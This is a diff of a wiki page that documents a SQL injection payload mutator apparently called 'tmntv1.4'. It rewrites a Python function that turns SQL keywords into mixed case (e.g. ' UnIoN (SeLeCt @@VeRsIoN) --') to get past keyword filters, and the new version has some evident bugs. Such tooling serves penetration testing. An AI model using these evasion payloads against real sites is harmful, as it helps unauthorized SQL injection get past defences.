@@ -53,42 +53,46 @@ This function adds case variation:
 
 {{{
 
-def caseVariationAdder(_payloadList): # Adding case variation
-
- _addVarietion1 = re.compile( '(select|SELECT)')
- _addVarietion2 = re.compile( '(insert|INSERT)')
- _addVarietion3 = re.compile( '(update|UPDATE)')
- _addVarietion4 = re.compile( '(version|VERSION)')
- _addVarietion5 = re.compile( '(union|UNION)')
- _addVarietion6 = re.compile( '(exec|EXEC)')
- _addVarietion7 = re.compile( '(null|NULL)')
- _addVarietion8 = re.compile( '(value|VALUE)')
- _addVarietion9 = re.compile( '(CASE|case)')
- _addVarietion10 = re.compile( '(drop|DROP)')
- _addVarietion11 = re.compile( '(create|CREATE)')
- _addVarietion12 = re.compile( '(tablespace|TABLESPACE)')
+def caseVarietionAdder(_payloadList): # Adding case variation
+ 
+ checkDirectoryExitstance() 
 
  currentTime = getTime()+'_'
- 
- _mutatePayloadFile = currentTime+"caseVariationPayloads.lst"
- _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
- 
- for _payloadline in _payloadList: 
-   _mutated1 = _addVarietion1.sub( 'SeLeCt', _payloadline, count=0)
-   _mutated2 = _addVarietion2.sub( 'InSeRt', _mutated1, count=0)
-   _mutated3 = _addVarietion3.sub( 'UpDaTe', _mutated2, count=0)
-   _mutated4 = _addVarietion4.sub( 'VeRsIoN', _mutated3, count=0)
-   _mutated5 = _addVarietion5.sub( 'UnIoN', _mutated4, count=0)
-   _mutated6 = _addVarietion6.sub( 'ExEc', _mutated5, count=0)
-   _mutated7 = _addVarietion7.sub( 'NuLl', _mutated6, count=0)
-   _mutated8 = _addVarietion8.sub( 'VaLuE', _mutated7, count=0)
-   _mutated9 = _addVarietion9.sub( 'CaSe', _mutated8, count=0)
-   _mutated10 = _addVarietion10.sub( 'DrOp', _mutated9, count=0)
-   _mutated11 = _addVarietion11.sub( 'CrEaTe', _mutated10, count=0)
-   _mutated12 = _addVarietion12.sub( 'TaBlEsPaCe', _mutated11, count=0)
-   _mutated13 = _mutated12
-   _mutatePayloadFileObj.write( _mutated13 +'\n')
 
+ _mutatePayloadFile = currentTime+"caseVarietionPayloads.lst"
+ _mutatePayloadFileObj = open(_mutatePayloadFile,"a")
+ 
+ _sqlKeywordElementsFile = sqlKeywordFile
+ _sqlKeywordElementsFileObj = open(_sqlKeywordElementsFile,"r")
+ _sqlKeywordList = _sqlKeywordElementsFileObj.readlines()
+
+ _temp = open("temp.ls","a+")
+ _tempList = _payloadList
+ 
+ _sqlKeyWordDictionary = {} # Holding SQL keywords mapping them to SQL keywords with case variation
+ _searchList = [] # Holding only SQL keywords for later searching
+ 
+ # Populate dictionary with SQL keywords and equvalent SQL keyword values with case variation
+ for _sqlKeyword in _sqlKeywordList:
+    _sqlKeyWordDictionary[str(_sqlKeyword).rstrip()] = addCaseVarietionToKeyword(_sqlKeyword)
+
+ # Populate list with SQL keywords for searching later on
+ for _sqlKeywordKey, _sqlKeywordValue in _sqlKeyWordDictionary.iteritems():
+    _searchList.append(_sqlKeywordKey)
+
+ # Write Temporary file with new payloads then filter lines to write to final payload file 
+ for _tempLine in  _tempList:
+    for _sqlKeywordKey, _sqlKeywordValue  in _sqlKeyWordDictionary.iteritems():
+        if re.search(_sqlKeywordKey,_tempLine):
+            _tempLine = str(_tempLine).replace(_sqlKeywordKey,_sqlKeywordValue)
+            
+            if not searchPayloadLine(_searchList,_tempLine):
+                _mutatePayloadFileObj.write(_tempLine)
+                print _tempLine
+                print _sqlKeywordKey
+ 
+ _mutatePayloadFileObj = _temp
+ _temp.close()
  _mutatePayloadFileObj.close()
 
 }}}
@@ -97,9 +101,9 @@ def caseVariationAdder(_payloadList): # Adding case variation
 
 Input payload: ' union (select @@version) --
 
-Output payload: ' UnIoN (SeLeCt @@version) --
+Output payload: ' UnIoN (SeLeCt @@VeRsIoN) --
 
-*Note*: The tmntv1.4 tool will take as an input a file. 
+*Note*: The tmntv1.4 tool will take as an input a file, it will then load SQL keywords from the CharContainer/sql_Keyword_Container.lst file and replace and generate a payload file with SQL keywords with case varietion.
 
 This function adds suffixes e.g. %00 etc :
 
